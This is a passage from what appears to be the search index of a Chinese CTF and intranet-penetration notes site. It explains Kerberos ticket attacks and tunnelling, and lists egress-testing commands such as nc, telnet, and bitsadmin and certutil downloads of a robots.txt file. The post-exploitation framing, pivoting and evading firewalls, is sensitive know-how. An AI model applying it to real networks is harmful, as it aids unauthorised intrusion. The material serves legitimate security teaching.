u4f46\u662f\u5bc6\u7801\u55b7\u6d12\u662f\u7528\u56fa\u5b9a\u7684\u5bc6\u7801\u53bb\u8dd1\u6240\u6709\u7684\u7528\u6237\u540d\u3002</p> <p>\u5728 AS-REP \u9636\u6bb5\uff0c\u7531\u4e8e\u8fd4\u56de\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u662f\u7531 krbtgt \u7528\u6237\u7684\u5bc6\u7801 Hash \u52a0\u5bc6\u7684\uff0c\u56e0\u6b64\u5982\u679c\u6211\u4eec\u62e5\u6709 krbtgt \u7684\u5bc6\u7801 hash \u5c31\u53ef\u4ee5\u81ea\u5df1\u5236\u4f5c\u4e00\u4e2a TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u88ab\u79f0\u4e3a\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u3002\u540c\u6837\uff0c\u5728 TGS-REP \u9636\u6bb5\uff0cTGS_REP \u91cc\u9762\u7684 ST \u670d\u52a1\u7968\u636e\u662f\u4f7f\u7528\u670d\u52a1\u7684 hash \u8fdb\u884c\u52a0\u5bc6\u7684\uff0c\u5982\u679c\u6211\u4eec\u62e5\u6709\u670d\u52a1\u7684 hash\uff0c\u5c31\u53ef\u4ee5\u7b7e\u53d1\u4efb\u610f\u7528\u6237\u7684 ST \u670d\u52a1\u7968\u636e\uff0c\u8fd9\u4e2a\u7968\u636e\u4e5f\u88ab\u79f0\u4e3a\u767d\u94f6\u7968\u636e\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u88ab\u79f0\u4e3a\u767d\u94f6\u7968\u636e\u653b\u51fb\u3002\u76f8\u8f83\u4e8e\u9ec4\u91d1\u7968\u636e\uff0c\u767d\u94f6\u7968\u636e\u4f7f\u7528\u8981\u8bbf\u95ee\u670d\u52a1\u7684 hash\uff0c\u800c\u4e0d\u662fkrbtgt \u7684 hash\u3002</p> <p>\u5728 AS-REP \u9636\u6bb5\uff0cLogin session key \u662f\u7528\u7528\u6237\u5bc6\u7801 Hash \u52a0\u5bc6\u7684\u3002\u5bf9\u4e8e\u57df\u7528\u6237\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86\u201cDo not require Kerberos preauthentication\u201d\u4e0d\u9700\u8981\u9884\u8ba4\u8bc1\u9009\u9879\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u5411\u57df\u63a7\u5236\u5668\u7684 88 \u7aef\u53e3\u53d1\u9001 AS_REQ \u8bf7\u6c42\uff0c\u6b64\u65f6\u57df\u63a7\u4e0d\u4f1a\u505a\u4efb\u4f55\u9a8c\u8bc1\u5c31\u5c06 TGT \u8ba4\u8d2d\u6743\u8bc1 \u548c \u8be5\u7528\u6237 Hash \u52a0\u5bc6\u7684 Login Session Key \u8fd4\u56de\u3002\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5bf9\u83b7\u53d6\u5230\u7684 \u7528\u6237 Hash \u52a0\u5bc6\u7684 Login Session Key \u8fdb\u884c\u79bb\u7ebf\u7834\u89e3\uff0c\u5982\u679c\u7834\u89e3\u6210\u529f\uff0c\u5c31\u80fd\u5f97\u5230\u8be5\u7528\u6237\u7684\u5bc6\u7801\u660e\u6587\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u88ab\u79f0\u4e3a AS-REPRoasting \u653b\u51fb\u3002</p> <p>\u5728 TGS-REP \u9636\u6bb5\uff0c\u7531\u4e8e ST \u670d\u52a1\u7968\u636e\u662f\u7528\u670d\u52a1 Hash \u52a0\u5bc6\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u80fd\u83b7\u53d6\u5230 ST \u670d\u52a1\u7968\u636e\uff0c\u5c31\u53ef\u4ee5\u5bf9\u8be5 ST \u670d\u52a1\u7968\u636e\u8fdb\u884c\u5229\u606f\u7834\u89e3\uff0c\u5f97\u5230\u670d\u52a1\u7684Hash\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u88ab\u79f0\u4e3a Kerberoasting \u653b\u51fb\u3002\u8fd9\u4e2a\u95ee\u9898\u5b58\u5728\u7684\u53e6\u5916\u4e00\u4e2a\u56e0\u7d20\u662f\u56e0\u4e3a\u7528\u6237\u5411 KDC \u53d1\u8d77 TGS_REQ \u8bf7\u6c42\uff0c\u4e0d\u7ba1\u7528\u6237\u5bf9\u670d\u52a1\u6709\u6ca1\u6709\u8bbf\u95ee\u6743\u9650\uff0c\u53ea\u8981TGT \u8ba4\u8d2d\u6743\u8bc1\u6b63\u786e\uff0c\u90a3\u4e48 KDC \u90fd\u4f1a\u8fd4\u56de ST \u670d\u52a1\u7968\u636e\u3002\u5176\u5b9e AS_REQ \u91cc\u9762\u7684\u670d\u52a1\u5c31\u662f krbtgt\uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd9\u4e2a\u653b\u51fb\u65b9\u5f0f\u540c\u6837\u53ef\u4ee5\u7528\u4e8e\u7206\u7834 AS_REP \u91cc\u9762\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u4f46\u662f\u4e4b\u6240\u4ee5\u6ca1\u89c1\u5230\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u662f\u56e0\u4e3a krbtgt \u7684\u5bc6\u7801\u662f\u968f\u673a\u751f\u6210\u7684\uff0c\u7206\u7834\u4e0d\u51fa\u6765\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/index.html","title":"Tunnel_technology","text":"<ul> <li>\u96a7\u9053\u7a7f\u900f\u6280\u672f</li> <li>\u5982\u4f55\u5224\u65ad\u5404\u79cd\u534f\u8bae\u662f\u5426\u51fa\u7f51</li> <li>\u96a7\u9053\u7a7f\u900f\u6280\u672f</li> <li>\u901a\u8fc7Earthworm(EW)\u8fdb\u884c\u96a7\u9053\u7a7f\u900f</li> </ul>"},{"location":"CTF/Intranet_security/Tunnel_technology/article1/index.html","title":"\u96a7\u9053\u7a7f\u900f\u6280\u672f\u8be6\u89e3","text":"<p>\u5047\u8bbe\u6211\u4eec\u83b7\u53d6\u5230\u4e00\u53f0\u5185\u7f51\u4e3b\u673a\u7684\u6743\u9650\uff0c\u5e76\u5e0c\u671b\u5c06\u8fd9\u53f0\u4e3b\u673a\u4f5c\u4e3a\u8df3\u677f\uff0c\u901a\u8fc7\u5916\u7f51\u4e3b\u673a\u8bbf\u95ee\u5230\u5185\u7f51\u8fdb\u884c\u540e\u7eed\u6e17\u900f\u5229\u7528\uff0c\u800c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u6211\u4eec\u53ef\u80fd\u4f1a\u78b0\u5230\u4e00\u4e9b\u963b\u788d\uff0c\u6bd4\u5982\u9632\u706b\u5899\u3001\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u7b49\uff0c\u8fd9\u4e9b\u5b89\u5168\u9632\u62a4\u63aa\u65bd\u4e0d\u5141\u8bb8\u6709\u5f02\u5e38\u7aef\u53e3\u5bf9\u5916\u53d1\u8d77\u901a\u4fe1\u8fde\u63a5\uff0c\u6b64\u65f6\u4fbf\u65e0\u6cd5\u901a\u8fc7\u5728\u8fd9\u53f0\u53d7\u63a7\u4e3b\u673a\u4e0a\u5f00\u542f\u5355\u72ec\u7684\u7aef\u53e3\u6765\u4e0e\u5916\u754c\u8fde\u63a5\u901a\u4fe1\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5bfb\u627e\u9632\u706b\u5899\u7b49\u9632\u62a4\u8bbe\u5907\u5141\u8bb8\u4e0e\u5916\u754c\u901a\u8baf\u7684\u7aef\u53e3\uff0c\u5c06\u6570\u636e\u5305\u6df7\u6742\u5728\u6b63\u5e38\u6d41\u91cf\u4e2d\uff0c\u901a\u8fc7\u6b63\u5e38\u7aef\u53e3\u53d1\u9001\u5230\u5916\u7f51\u653b\u51fb\u673a\u6765\u5b9e\u73b0\u7ed5\u8fc7\u9632\u706b\u5899\u7684\u76ee\u7684\uff0c\u8fd9\u79cd\u6280\u672f\u5c31\u53eb\u505a\u5185\u7f51\u96a7\u9053\u7a7f\u900f\u6280\u672f\uff0c\u800c\u8fd9\u4e2a\u6570\u636e\u5305\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6240\u7ecf\u5386\u7684\u903b\u8f91\u8def\u5f84\u5c31\u53eb\u505a\u96a7\u9053\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article1/index.html#1","title":"1.\u6b63\u5411\u8fde\u63a5","text":"<p>\u6b63\u5411\u8fde\u63a5\u662f\u6307\u672c\u5730\u4e3b\u673a\u5411\u76ee\u6807\u4e3b\u673a\u7684Web\u670d\u52a1\u53d1\u8d77\u8bbf\u95ee\u8bf7\u6c42\uff0c\u76ee\u6807\u4e3b\u673a\u6536\u5230\u8bf7\u6c42\u540e\u4e24\u8005\u4e92\u76f8\u5efa\u7acb\u901a\u4fe1\u8fde\u63a5\u7684\u8fc7\u7a0b\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u573a\u666f\u4e2d\uff0c\u6b63\u5411\u8fde\u63a5\u8fd9\u79cd\u65b9\u5f0f\u5e38\u7528\u4e8e\u76ee\u6807\u4e3b\u673a\u4e0d\u51fa\u7f51\u6216\u8005\u76ee\u6807\u6709\u516c\u7f51IP\u5730\u5740\u4e14\u6ca1\u6709\u9632\u706b\u5899\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u5229\u7528Web\u6b63\u5411\u8fde\u63a5\u53bb\u642d\u5efa\u4ee3\u7406\u96a7\u9053\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article1/index.html#2","title":"2.\u53cd\u5411\u8fde\u63a5","text":"<p>\u53cd\u5411\u8fde\u63a5\u662f\u6307\u5047\u8bbe\u5f53\u6211\u4eec\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u4f7f\u5176\u4e3b\u52a8\u53d1\u8d77\u8bf7\u6c42\u53bb\u8bbf\u95ee\u653b\u51fb\u8005\u6240\u4f7f\u7528\u5177\u6709\u516c\u7f51IP\u7684\u4e3b\u673a\uff0c\u4ece\u800c\u5efa\u7acb\u4e24\u8005\u4e4b\u95f4\u7684\u8fde\u63a5\uff0c\u53ef\u4ee5\u4e92\u76f8\u8bbf\u95ee\u901a\u4fe1\u3002\u53cd\u5411\u8fde\u63a5\u548c\u6b63\u5411\u8fde\u63a5\u6070\u597d\u76f8\u53cd\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u573a\u666f\u4e2d\uff0c\u53cd\u5411\u8fde\u63a5\u8fd9\u79cd\u65b9\u5f0f\u5e38\u7528\u4e8e\u76ee\u6807\u4e3b\u673a\u51fa\u7f51\u7684\u60c5\u51b5\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article1/index.html#3","title":"3.\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u7aef\u53e3\u8f6c\u53d1\u662f\u6307\u5c06\u67d0\u4e00\u4e2a\u7aef\u53e3\u63a5\u6536\u5230\u7684\u6d41\u91cf\u8f6c\u53d1\u5230\u53e6\u5916\u4e00\u4e2a\u672c\u5730\u7aef\u53e3\u6216\u8005\u5176\u4ed6\u7f51\u7edc\u7aef\u53e3\u4e0a\u7684\u8fc7\u7a0b\uff0c\u5047\u8bbe\u5728\u7ea2\u84dd\u5bf9\u6297\u4e2d\uff0c\u7ea2\u961f\u4eba\u5458\u83b7\u53d6\u5230Web\u670d\u52a1\u5668\u7684\u6743\u9650\uff0c\u901a\u8fc7\u4fe1\u606f\u6536\u96c6\u7684\u65b9\u5f0f\u53d1\u73b0Web\u670d\u52a1\u5668\u5177\u6709\u53cc\u7f51\u5361\uff0c\u5e76\u4e14\u53ef\u4ee5\u548c\u5185\u7f51\u9776\u673a\u4e3b\u673a\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u653b\u51fb\u673a\u80fd\u901a\u8fc7RDP\u8fdc\u7a0b\u7684\u65b9\u5f0f\u8fdc\u7a0b\u5230\u5185\u7f51\u9776\u673a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7aef\u53e3\u8f6c\u53d1\u65b9\u5f0f\u5c06\u5185\u7f51\u9776\u673a\u76843389\u7aef\u53e3\u8f6c\u53d1\u5230Web\u670d\u52a1\u5668\u768480\u7aef\u53e3\u4e0a\uff0c\u653b\u51fb\u673a\u518d\u901a\u8fc7\u8bbf\u95eeWeb\u670d\u52a1\u5668\u768480\u7aef\u53e3\u76f4\u63a5\u8bbf\u95ee\u5230\u5185\u7f51\u9776\u673a3389\u7aef\u53e3RDP\u670d\u52a1\uff0c\u4ee5\u6b64\u8fbe\u5230\u901a\u8baf\u7684\u76ee\u7684\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article1/index.html#4","title":"4.\u4ee3\u7406\u548c\u96a7\u9053\u7684\u533a\u522b","text":"<p>\u4ee3\u7406\u5b83\u662f\u6307\u4e00\u79cd\u7279\u6b8a\u7684\u7f51\u7edc\u670d\u52a1\uff0c\u5b83\u5141\u8bb8\u4e00\u4e2a\u7f51\u7edc\u7ec8\u7aef\u901a\u8fc7\u4ee3\u7406\u670d\u52a1\u4e0e\u53e6\u4e00\u4e2a\u7f51\u7edc\u7ec8\u7aef\u8fdb\u884c\u975e\u76f4\u63a5\u7684\u8fde\u63a5,\u5b83\u626e\u6f14\u4e86\u4f4d\u4e8e\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u7684\u201c\u4e2d\u95f4\u4eba\u201d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u53d7\u63a7\u4e3b\u673a\u8bbe\u7f6e\u4ee3\u7406\u670d\u52a1\uff0c\u53bb\u8bbf\u95ee\u76ee\u6807\u5185\u7f51\u4e2d\u5176\u4ed6\u4e3b\u673a\u7684\u670d\u52a1\u3002</p> <p>\u96a7\u9053\u4e3b\u8981\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u6570\u636e\u5305\u65e0\u6cd5\u4f20\u8f93\uff0c\u96a7\u9053\u6280\u672f\u4e00\u822c\u7528\u6765\u7ed5\u8fc7\u4e00\u4e9b\u5b89\u5168\u8bbe\u5907\u7684\u76d1\u63a7\uff0c\u4f8b\u5982\u9632\u706b\u5899\u8fc7\u6ee4\uff0c\u7f51\u7edc\u8fde\u63a5\u901a\u8baf\uff0c\u6570\u636e\u56de\u94fe\u5c01\u88c5\u7b49\uff0c\u5982\u679c\u5b89\u5168\u9632\u62a4\u8bbe\u5907\u5bf9\u6211\u4eec\u53d1\u9001\u7684\u6d41\u91cf\u8fdb\u884c\u62e6\u622a\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u96a7\u9053\u6280\u672f\u6765\u7ed5\u8fc7\u62e6\u622a\uff0c\u96a7\u9053\u6280\u672f\u5c31\u662f\u4f7f\u7528\u4e0d\u540c\u7684\u534f\u8bae\u6280\u672f\u6765\u5efa\u7acb\u901a\u8baf\u8fde\u63a5,\u5f53\u7136\uff0c\u5728\u96a7\u9053\u4e2d\u4e5f\u662f\u5305\u542b\u4e86\u4e00\u4e9b\u5173\u4e8e\u4ee3\u7406\u7684\u6280\u672f\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article1/index.html#5","title":"5.\u5e38\u89c1\u96a7\u9053\u8f6c\u53d1\u573a\u666f","text":"\u8f6c\u53d1\u573a\u666f \u5177\u4f53\u63cf\u8ff0 \u76ee\u6807\u5904\u4e8e\u7f51\u7edc\u8fb9\u754c \u5185\u5916\u7f51\u90fd\u53ef\u4ee5\u8bbf\u95ee\u3001\u7f51\u7edc\u8fb9\u754c\u4e3b\u673a\u672a\u5b89\u88c5\u9632\u706b\u5899\u6240\u6709\u7aef\u53e3\u90fd\u5bf9\u4e92\u8054\u7f51\u5f00\u653e \u76ee\u6807\u5904\u4e8e\u5185\u7f51 \u5141\u8bb8\u7279\u5b9a\u7684\u5e94\u7528\u5c42\u534f\u8bae\u51fa\u7f51(\u6bd4\u5982HTTP\u3001SSH\u3001DNS\u7b49\u5e94\u7528\u5c42\u534f\u8bae)(3389\u300122\u3001445\u300153\u300180\u3001443\u7b49) \u76ee\u6807\u5904\u4e8e\u5185\u7f51\uff0c\u4e0d\u80fd\u8bbf\u95ee\u5916\u7f51 \u53ef\u4ee5\u8bbf\u95ee\u8fb9\u754c\u4e3b\u673a\uff0c\u9632\u706b\u5899\u7b56\u7565\u9650\u5236\u5916\u90e8\u7f51\u7edc\u76f4\u63a5\u8bbf\u95ee\u5185\u7f51\u7684\u654f\u611f\u7aef(3389\u300122\u3001445\u7b49)\u3002"},{"location":"CTF/Intranet_security/Tunnel_technology/article1/index.html#6","title":"6.\u5e38\u89c1\u96a7\u9053\u7a7f\u900f\u5206\u7c7b","text":"<p>\u4ece\u8ba1\u7b97\u673aOSI \u4e03\u5c42\u6a21\u578b\u6765\u8bb2\u96a7\u9053\u7a7f\u900f\u6280\u672f\u4e3b\u8981\u5e94\u7528\u5728\u5e94\u7528\u5c42\uff0c\u4f20\u8f93\u5c42\uff0c\u7f51\u7edc\u5c42\u8fd9\u4e09\u5c42\uff0c\u6bcf\u4e00\u5c42\u5e38\u89c1\u7684\u96a7\u9053\u5229\u7528\u65b9\u5f0f\u53ca\u96a7\u9053\u7c7b\u578b\u5982\u8868</p> \u96a7\u9053\u65b9\u5f0f \u96a7\u9053\u7c7b\u578b \u5e94\u7528\u5c42\u96a7\u9053 SSH\u96a7\u9053\uff0cHTTP\u96a7\u9053\uff0cHTTPS\u96a7\u9053\uff0cDNS\u96a7\u9053 \u4f20\u8f93\u5c42\u96a7\u9053 TCP\u96a7\u9053\uff0cUDP\u96a7\u9053 \u7f51\u7edc\u5c42\u96a7\u9053 IPv6\u96a7\u9053\uff0cICMP\u96a7\u9053\uff0cGRE\u96a7\u9053"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html","title":"\u5982\u4f55\u5224\u65ad\u5404\u79cd\u534f\u8bae\u662f\u5426\u51fa\u7f51","text":"<p>\u5728\u8fdb\u884c\u5185\u7f51\u6e17\u900f\u65f6\uff0c\u7ecf\u5e38\u4f1a\u9047\u5230\u76ee\u6807\u4e3b\u673a\u4e0d\u51fa\u7f51\u7684\u573a\u666f\uff0c\u800c\u4e3b\u673a\u4e0d\u51fa\u7f51\u7684\u539f\u56e0\u6709\u5f88\u591a\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u4f8b\u5982\u76ee\u6807\u4e3b\u673a\u672a\u8bbe\u7f6e\u7f51\u5173\uff0c\u88ab\u9632\u706b\u5899\u6216\u8005\u5176\u4ed6\u9632\u62a4\u8bbe\u5907\u62e6\u622a\u8bbe\u7f6e\u4e86\u51fa\u5165\u7ad9\u7b56\u7565\uff0c\u53ea\u5141\u8bb8\u7279\u5b9a\u534f\u8bae\u6216\u7aef\u53e3\u51fa\u7f51\u7b49\u3002\u5f53\u6211\u4eec\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\u65f6\uff0c\u5229\u7528\u5404\u79cd\u5305\u542b\u8be5\u534f\u8bae\u7684\u65b9\u5f0f\u63a2\u6d4b\u76ee\u6807\u4e3b\u673a\u5141\u8bb8\u54ea\u4e9b\u534f\u8bae\u51fa\u7f51\uff0c\u6839\u636e\u63a2\u6d4b\u5230\u7684\u534f\u8bae\u4fe1\u606f\u8fdb\u884c\u96a7\u9053\u7a7f\u900f\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#1tcpudp","title":"1.TCP/UDP\u534f\u8bae\u63a2\u6d4b\u51fa\u7f51","text":""},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#1nctcp","title":"1.NC\u5de5\u5177\u63a2\u6d4bTCP\u534f\u8bae\u51fa\u7f51","text":"<p>\u4f7f\u7528netcat\u5de5\u5177\uff0c\u6267\u884c\"nc \" <pre><code>nc -lnpv ip port\nnc -lnpv 192.168.1.108 80       # TCP\n</code></pre>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#2telnettcp","title":"2.Telnet\u547d\u4ee4\u63a2\u6d4bTCP\u534f\u8bae\u51fa\u7f51","text":"<p>1\uff09\u4f7f\u7528Telnet\u547d\u4ee4\u6765\u63a2\u6d4b\u76ee\u6807\u670d\u52a1\u5668\u662f\u5426\u51fa\u7f51\uff0c\u9996\u5148\u9700\u8981\u5728\u76ee\u6807\u670d\u52a1\u5668\u4f7f\u7528nc\u5de5\u5177\u5f00\u542f\u76d1\u542c4444\u7aef\u53e3\uff0c\u6267\u884c\u547d\u4ee4<code>nc -lvnp 4444</code>\uff0c\u6210\u529f\u5f00\u542f\u76ee\u6807\u670d\u52a1\u5668\u76d1\u542c</p> <p></p> <p>2\uff09\u5f53\u5f00\u542f\u76d1\u542c\u540e\uff0c\u5728\u672c\u5730\u4e3b\u673a\u4e2d\u4f7f\u7528Telnet\u547d\u4ee4\u8fde\u63a5\u5230\u76ee\u6807\u670d\u52a1\u5668\u3002\u6267\u884c<code>telnet 192.168.111.128 4444</code>\u547d\u4ee4\uff0c\u5982\u56fe\u5219\u8bc1\u660e\u8fde\u63a5\u6210\u529f\uff0c\u5373\u4ee3\u8868\u5141\u8bb8TCP\u51fa\u7f51\u3002</p> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#3udp","title":"3.UDP\u534f\u8bae\u63a2\u6d4b\u51fa\u7f51","text":"<pre><code>nc -zuv ip port\nnc -zuv 192.168.1.108 80    # UDP\n</code></pre>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#2httphttps","title":"2.HTTP/HTTPS\u534f\u8bae\u63a2\u6d4b\u51fa\u7f51","text":"<p>\u6839\u636e\u76ee\u6807\u7cfb\u7edf\u7c7b\u578b\u53bb\u6267\u884c\u547d\u4ee4\uff0c\u4e0d\u540c\u7c7b\u578b\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4f7f\u7528\u7684\u63a2\u6d4b\u65b9\u5f0f\u4e5f\u4e0d\u540c\uff0c\u4f8b\u5982\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u53ef\u4ee5\u4f7f\u7528\u81ea\u5e26\u7684bitsadmin\u3001certutil\u7b49\u547d\u4ee4\u6765\u5bf9Http\u6216Https\u8fdb\u884c\u51fa\u7f51\u63a2\u6d4b\uff0clinux\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u4f7f\u7528\u81ea\u5e26\u7684curl\u3001wget\u7b49\u547d\u4ee4\u8fdb\u884c\u51fa\u7f51\u63a2\u6d4b\u3002</p> <p>Windows XP \u548c Windows Server 2003\u6ca1\u6709Powershell\u3001bitsadmin\uff0ccertutil\u4e5f\u4e0d\u80fd\u7528\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#1windowshttphttps","title":"1.Windows\u7cfb\u7edf\u63a2\u6d4bHTTP/HTTPS\u51fa\u7f51","text":""},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#1bitsadmin","title":"(1)Bitsadmin \u547d\u4ee4","text":"<p>Bitsadmin\u547d\u4ee4\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u662f\u7528\u4e8e\u521b\u5efa\u3001\u4e0b\u8f7d\u6216\u4e0a\u4f20\u4f5c\u4e1a\uff0c\u5e76\u76d1\u89c6\u4f5c\u4e1a\u8fdb\u5ea6\u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002\u53ef\u901a\u8fc7\u8be5\u547d\u4ee4\u884c\u5de5\u5177\u6d4b\u8bd5\u80fd\u5426\u4ece\u7f51\u7ad9\u4e0b\u8f7d\u6587\u4ef6\uff0c\u4ee5\u6b64\u6765\u68c0\u6d4bhttp\u6216https\u662f\u5426\u51fa\u7f51\uff0c\u4e0b\u9762\u6211\u4eec\u4ee5\u767e\u5ea6\u5b98\u7f51\u7684robots.txt\u4e3a\u4f8b\u8fdb\u884c\u6f14\u793a\uff0c\u4f7f\u7528Bitsadmin\u547d\u4ee4\u4e0b\u8f7d\u767e\u5ea6\u5b98\u7f51\u76ee\u5f55\u4e0b\u7684robots.txt\u6587\u4ef6\uff0c\u5e76\u4fdd\u5b58\u5230\u672c\u5730C\u76d8\u4e0b\u7684robots.txt\u4e2d\u3002</p> <p>\u6267\u884c<code>bitsadmin /rawreturn /transfer down \"https://www.baidu.com/robots.txt\" c:\\robots.txt</code>\u547d\u4ee4\uff0c\u6b64\u65f6\u5df2\u6210\u529f\u4e0b\u8f7drobots.txt\u6587\u4ef6\u5230C\u76d8\u76ee\u5f55\u4e0b\u3002\u7136\u540e\u901a\u8fc7<code>type C:\\robots.txt</code>\u547d\u4ee4\u8bfb\u53d6\u67e5\u770b\uff0c\u9a8c\u8bc1\u5176\u5b58\u5728\uff0c\u5982\u82e5\u6b63\u5e38\u5219\u8bc1\u660e\u63a2\u6d4b\u51fa\u7f51\u6210\u529f\uff0c\u5982\u56fe.</p> <p></p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#2certuil","title":"(2)Certuil \u547d\u4ee4","text":"<p>Certuil\u547d\u4ee4\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4e00\u6b3e\u4e0b\u8f7d\u6587\u4ef6\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u4f5c\u4e3a\u8bc1\u4e66\u670d\u52a1\u7684\u5b89\u88c5\uff0c\u7528\u6765\u8f6c\u50a8\u548c\u663e\u793a\u8bc1\u4e66\u9881\u53d1\u673a\u6784 (CA) \u914d\u7f6e\u4fe1\u606f\uff0c\u914d\u7f6e\u8bc1\u4e66\u670d\u52a1\uff0c\u5907\u4efd\u548c\u8fd8\u539fCA\u7ec4\u4ef6\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u8bc1\u4e66\u3001\u5bc6\u94a5\u5bf9\u548c\u8bc1\u4e66\u94fe\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u8fd8\u662f\u4ee5\u767e\u5ea6\u7f51\u7ad9\u4e0b\u7684\u7684robots.txt\u6587\u4ef6\u4e3a\u6848\u4f8b\uff0c\u4f7f\u7528Certuil\u547d\u4ee4\u6267\u884c<code>certutil -urlcache -split -f https://www.baidu.com/robots.txt c:\\robots.txt</code>\u5c06\u767e\u5ea6\u7f51\u7ad9\u4e0b\u7684robots.txt\u6587\u4ef6\u4fdd\u5b58\u5230\u672c\u5730C\u76d8\u76ee\u5f55\u4e0b\uff0c\u901a\u8fc7\u9a8c\u8bc1\u53d1\u73b0robots.txt\u6587\u4ef6\u5b58\u5728\uff0c\u5219\u8bc1\u660ehttp/https\u534f\u8bae\u51fa\u7f51\uff0c\u5982\u56fe.</p> <p></p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#2linuxhttphttps","title":"2.Linux\u7cfb\u7edf\u63a2\u6d4bHTTP/HTTPS\u51fa\u7f51","text":""},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#1curl","title":"(1)Curl\u547d\u4ee4","text":"<pre><code>curl http://www.baidu.com\n</code></pre>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#2wget","title":"(2)Wget\u547d\u4ee4","text":"<pre><code>wget http://www.baidu.com/robots.txt\n</code></pre>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#3icmp","title":"3.ICMP\u534f\u8bae\u63a2\u6d4b\u51fa\u7f51","text":"<p>ICMP\uff08Internet Control Message Protocol\uff09\u662f\u4e00\u79cd\u9762\u5411\u65e0\u8fde\u63a5\u7684\u534f\u8bae\uff0c\u5c5e\u4e8e\u7f51\u7edc\u5c42\u7684\u534f\u8bae\uff0c\u7528\u4e8e\u68c0\u6d4b\u7f51\u7edc\u901a\u4fe1\u6545\u969c\u548c\u5b9e\u73b0\u94fe\u8def\u8ffd\u8e2a\u3002\u5f53\u6211\u4eec\u9700\u8981\u5224\u65ad\u63a2\u6d4bICMP\u534f\u8bae\u662f\u5426\u51fa\u7f51\u65f6\uff0c\u53ef\u901a\u8fc7Ping\u548cTracert\u547d\u4ee4\u8fdb\u884c\u63a2\u6d4b.</p> <p>Tracert\u547d\u4ee4\u662fWindows\u4e2d\u7528\u6765\u8ddf\u8e2a\u8def\u7531\u7684\u547d\u4ee4\uff0c\u5b83\u4f9d\u9760ICMP\u534f\u8bae\u5b9e\u73b0\uff0c\u5728ICMP\u51fa\u7f51\u6d4b\u8bd5\u4e2d\u53ea\u9700\u8981\u4f7f\u7528Tracert\u547d\u4ee4\u8ddf\u8e2a\u4e0b\u76ee\u6807\u5730\u5740\u5373\u53ef\uff0c\u4ee5\u767e\u5ea6\u4e3a\u6848\u4f8b\uff0c\u6267\u884ctracert baidu.com\u547d\u4ee4\uff0c\u83b7\u5f97\u5982\u56fe\u6240\u793a\u7684\u8fd4\u56de\u4fe1\u606f\uff0c\u5373\u8bc1\u660e\u51fa\u7f51\u6210\u529f\u3002</p> <pre><code>\u6267\u884c\u547d\u4ee4\"ping &lt;IP\u5730\u5740\u6216\u57df\u540d&gt;\"\n\nping ip/domain\ntracert ip/domain\nping www.baidu.com  # ICMP\ntracert baidu.com   # ICMP\n</code></pre> 